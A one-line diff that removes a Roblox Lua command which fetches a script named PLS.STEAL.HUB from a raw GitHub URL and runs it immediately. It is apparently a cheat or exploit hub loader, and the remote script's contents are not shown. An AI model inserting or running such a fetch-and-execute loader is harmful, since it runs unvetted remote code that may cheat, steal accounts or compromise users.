@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/PLS.STEAL.HUB/main/PLS.STEAL.HUB.txt"))()
